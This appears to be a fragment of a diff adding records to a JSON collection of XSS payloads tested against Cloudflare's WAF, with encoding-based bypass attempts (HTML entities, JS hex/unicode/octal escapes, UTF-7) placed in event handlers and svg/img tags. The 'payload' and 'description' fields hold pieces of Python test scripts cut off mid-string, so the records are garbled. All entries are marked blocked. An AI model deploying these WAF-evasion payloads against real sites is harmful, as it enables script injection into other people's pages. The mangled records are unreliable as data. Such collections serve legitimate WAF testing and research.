\"ent-dec-alert\": '\" onfocus=&#97;lert(1) autofocus x=\"",
+      "description": "ent-hex-alert\": '\" onfocus=&#x61;lert(1) autofocus x=\"',\n    \"ent-full-alert\": '\" onfocus=&#97;&#108;&#101;&#114;&#116;(1) autofocus x=\"',\n    \"ent-hex-full\": '\" onfocus=&#x61;&#x6c;&#x65;&#x72;&#x74;(1) autofocus x=\"',\n    \n    # Entity-encoded parentheses\n    \"ent-parens\": '\" onfocus=alert&#40;1&#41; autofocus x=\"',\n    \"ent-hex-parens\": '\" onfocus=alert&#x28;1&#x29; autofocus x=\"',\n    \n    # Mix entity + plain\n    \"ent-mix-1\": '\" onfocus=al&#101;rt(1) autofocus x=\"',\n    \"ent-mix-2\": '\" onfocus=&#97;l&#101;r&#116;(1) autofocus x=\"',\n    \n    # Entity-encoded \"on\" prefix in attribute name\n    \"ent-on-name\": '\" &#111;nfocus=alert(1) autofocus x=\"',\n    \"ent-on-hex\": '\" &#x6f;nfocus=alert(1) autofocus x=\"',\n    \n    # Encode the entire event handler name\n    \"ent-onfocus-full\": '\" &#111;&#110;&#102;&#111;&#99;&#117;&#115;=alert(1) autofocus x=\"',\n    \n    # globalHtml with entity-encoded tags\n    \"ent-svg\": '&#60;svg/onload=alert(1)&#62;',\n    \"ent-svg-hex\": '&#x3c;svg/onload=alert(1)&#x3e;',\n    \"ent-full-svg\": '&#x3c;&#x73;&#x76;&#x67;/&#x6f;&#x6e;&#x6c;&#x6f;&#x61;&#x64;=alert(1)&#x3e;',\n    \n    # Named entities\n    \"ent-lt-gt\": '&lt;svg/onload=alert(1)&gt;',\n    \"ent-quot\": '&quot; onfocus=alert(1) autofocus x=&quot;',\n}\n\nfor name, payload in entity_payloads.items():\n    if 'globalHtml' not in name and 'svg' not in name and 'lt' not in name:\n        raw_post(f\"POST-{name}\", \n                 (f\"attributeHtml={urllib.parse.quote(payload)}",
+      "technique": "encoding",
+      "source_file": "waf_round57_binary.py",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xss-0505",
+      "category": "xss",
+      "subcategory": "encoded",
+      "payload": "\n\" + \"=\" * 80)\nprint(\"57C: JS Hex/Octal/Unicode Escapes in Event Handler Values\")\nprint(\"=\" * 80 + \"\n\")\n\n# In JS context (event handler value), these are valid:\n# \\x61lert(1) → alert(1)\n# \\u0061lert(1) → alert(1)\n# \\141lert(1) → alert(1) (octal, only in non-strict)\n\njs_esc = {\n    \"js-hex-alert\": r'\" onfocus=\\x61lert(1) autofocus x=\"",
+      "description": "js-unicode-alert\": r'\" onfocus=\\u0061lert(1) autofocus x=\"',\n    \"js-octal-alert\": r'\" onfocus=\\141lert(1) autofocus x=\"',\n    \"js-hex-full\": r'\" onfocus=\\x61\\x6c\\x65\\x72\\x74(1) autofocus x=\"',\n    \"js-unicode-full\": r'\" onfocus=\\u0061\\u006c\\u0065\\u0072\\u0074(1) autofocus x=\"',\n    # Mix JS escapes with gap\n    \"js-gap-hex\": r'\" on{focus=\\x61lert(1) autofocus x=\"',\n    \"js-gap-unicode\": r'\" on{focus=\\u0061lert(1) autofocus x=\"',\n}\n\nfor name, payload in js_esc.items():\n    raw_post(f\"POST-{name}\", (f\"attributeHtml={urllib.parse.quote(payload)}",
+      "technique": "encoding",
+      "source_file": "waf_round57_binary.py",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xss-0627",
+      "category": "xss",
+      "subcategory": "encoded",
+      "payload": "=\" * 75 + \"\n\")\n\nutf7 = {\n    \"meta-utf7-script\": '<meta charset=\"UTF-7\" /> +ADw-script+AD4-alert(1)+ADw-/script+AD4-",
+      "description": "meta-utf7-content\": '<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-7\" /> +ADw-script+AD4-alert(1)+ADw-/script+AD4-',\n    \"utf7-bom1\": '+/v8\\n+ADw-script+AD4-alert(1)+ADw-/script+AD4-',\n    \"utf7-bom2\": '+/v9\\n+ADw-script+AD4-alert(1)+ADw-/script+AD4-',\n    \"utf7-bom3\": '+/v+\\n+ADw-script+AD4-alert(1)+ADw-/script+AD4-',\n    # Standalone UTF-7 encoded XSS\n    \"utf7-svg\": '+ADw-svg onload+AD0-alert(1)+AD4-',\n    \"utf7-img\": '+ADw-img src+AD0-x onerror+AD0-alert(1)+AD4-',\n}\n\nfor name, payload in utf7.items():\n    test(name, {\"globalHtml\": payload})\n\n# ══════════════════════════════════════════════════════════════\nprint(\"\\n\" + \"=\" * 75)\nprint(\"17G: form + label + javascript: action",
+      "technique": "encoding",
+      "source_file": "waf_round17.py",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    }
+  ]
+}
